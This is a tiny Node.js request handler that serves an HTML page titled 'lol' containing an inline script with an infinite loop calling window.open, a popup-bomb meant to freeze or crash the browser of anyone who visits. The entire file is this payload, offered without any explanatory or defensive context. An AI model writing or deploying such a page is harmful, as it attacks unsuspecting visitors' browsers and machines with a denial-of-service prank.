module.exports = (req, res) => {
  res.send(`
  <html>
  <head><title>lol</title></head>
  <body>
    <script>
      while(1){Object.create(window);window.open()}
    </script>
    </body>
  </html>
  `)
}
